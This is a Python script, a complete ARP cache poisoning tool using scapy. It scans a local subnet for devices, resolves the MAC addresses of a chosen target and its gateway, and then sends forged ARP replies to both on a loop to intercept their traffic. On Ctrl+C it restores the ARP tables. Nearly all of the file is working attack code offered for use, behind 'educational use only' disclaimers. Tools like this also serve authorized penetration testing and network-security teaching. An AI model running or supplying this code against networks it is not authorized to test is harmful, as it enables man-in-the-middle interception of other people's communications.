#!/usr/bin/env python3
"""
ARP Spoofing/Poisoning Tool
This script performs ARP cache poisoning to intercept network traffic.
Use only for educational purposes and authorized testing.
"""

import argparse
import time
import sys
import signal
from scapy.all import ARP, Ether, send, get_if_hwaddr, getmacbyip, conf, srp

class ARPAttack:
    def __init__(self):
        self.target_ip = None
        self.gateway_ip = None
        self.interface = None
        self.target_mac = None
        self.gateway_mac = None
        self.running = False
        
    def get_mac(self, ip):
        """Get MAC address for a given IP"""
        try:
            mac = getmacbyip(ip)
            if mac is None:
                print(f"[-] Could not resolve MAC address for {ip}")
                return None
            return mac
        except Exception as e:
            print(f"[-] Error getting MAC for {ip}: {e}")
            return None
    
    def setup_attack(self, target_ip, gateway_ip, interface=None):
        """Setup the ARP attack parameters"""
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        
        # Set network interface
        if interface:
            self.interface = interface
            conf.iface = interface
        else:
            self.interface = conf.iface
        
        # Get MAC addresses
        print("[*] Resolving MAC addresses...")
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            print("[-] Failed to resolve MAC addresses. Check network connectivity.")
            return False
        
        print(f"[+] Target IP: {target_ip} -> MAC: {self.target_mac}")
        print(f"[+] Gateway IP: {gateway_ip} -> MAC: {self.gateway_mac}")
        print(f"[+] Interface: {self.interface}")
        
        return True
    
    def create_arp_packet(self, target_ip, target_mac, spoof_ip):
        """Create ARP poisoning packet"""
        return ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    def restore_network(self, target_ip, gateway_ip, target_mac, gateway_mac):
        """Restore ARP tables to normal state"""
        print("[*] Restoring ARP tables...")
        
        # Send correct ARP replies to restore network
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
        
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, 
                psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
        
        print("[+] Network restored")
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C signal to restore network"""
        print("\n[*] Ctrl+C detected. Stopping attack...")
        self.running = False
        if self.target_ip and self.gateway_ip and self.target_mac and self.gateway_mac:
            self.restore_network(self.target_ip, self.gateway_ip, 
                               self.target_mac, self.gateway_mac)
        sys.exit(0)
    
    def start_attack(self):
        """Start the ARP poisoning attack"""
        if not all([self.target_ip, self.gateway_ip, self.target_mac, self.gateway_mac]):
            print("[-] Attack not properly configured")
            return False
        
        print("[*] Starting ARP poisoning attack...")
        print("[*] Press Ctrl+C to stop and restore network")
        
        # Set up signal handler for clean exit
        signal.signal(signal.SIGINT, self.signal_handler)
        
        self.running = True
        packet_count = 0
        
        try:
            while self.running:
                # Poison target telling it we are the gateway
                send(self.create_arp_packet(self.target_ip, self.target_mac, self.gateway_ip), verbose=False)
                
                # Poison gateway telling it we are the target
                send(self.create_arp_packet(self.gateway_ip, self.gateway_mac, self.target_ip), verbose=False)
                
                packet_count += 2
                print(f"\r[*] Packets sent: {packet_count}", end="")
                sys.stdout.flush()
                
                time.sleep(2)  # Wait 2 seconds between sends
                
        except KeyboardInterrupt:
            self.signal_handler(None, None)
        except Exception as e:
            print(f"\n[-] Error during attack: {e}")
            self.running = False
        
        return True

def scan_network(network_prefix):
    """Scan the local network for devices"""
    try:
        # Create ARP request packet
        arp_request = ARP(pdst=f"{network_prefix}.0/24")
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        # Send packets and get responses
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        devices = []
        for element in answered_list:
            ip = element[1].psrc
            mac = element[1].hwsrc
            devices.append({"ip": ip, "mac": mac})
            
        return devices
        
    except Exception as e:
        print(f"Error scanning network: {e}")
        return []

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing/Poisoning Tool")
    parser.add_argument("-t", "--target", help="Target IP address")
    parser.add_argument("-g", "--gateway", help="Gateway IP address")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("--scan", action="store_true", help="Scan the local network")
    parser.add_argument("--network", help="Network prefix to scan (e.g., 192.168.1)")
    
    args = parser.parse_args()
    
    # Handle scan operation
    if args.scan:
        network_prefix = args.network
        if not network_prefix:
            # Try to guess network from gateway or use common prefix
            if args.gateway:
                network_prefix = '.'.join(args.gateway.split('.')[:-1])
            else:
                network_prefix = "192.168.1"
                
        print(f"Scanning network: {network_prefix}.0/24")
        devices = scan_network(network_prefix)
        
        if devices:
            print("Discovered devices:")
            print("IP Address\t\tMAC Address")
            print("-" * 40)
            for device in devices:
                print(f"{device['ip']}\t\t{device['mac']}")
        else:
            print("No devices found or scan failed.")
        return
    
    # Normal attack mode
    if not args.target or not args.gateway:
        parser.error("Target and gateway IP addresses are required for attack mode")
    
    # Check if running as root (required for raw socket operations)
    if not hasattr(os, 'getuid') or os.getuid() != 0:
        print("[-] This script must be run as root/administrator")
        sys.exit(1)
    
    print("""
    ARP Spoofing Tool - Educational Use Only
    ========================================
    WARNING: This tool is for educational purposes only.
    Unauthorized use may violate laws and regulations.
    Use only on networks you own or have permission to test.
    """)
    
    attack = ARPAttack()
    
    if attack.setup_attack(args.target, args.gateway, args.interface):
        attack.start_attack()
    else:
        print("[-] Failed to setup attack")

if __name__ == "__main__":
    import os
    main()
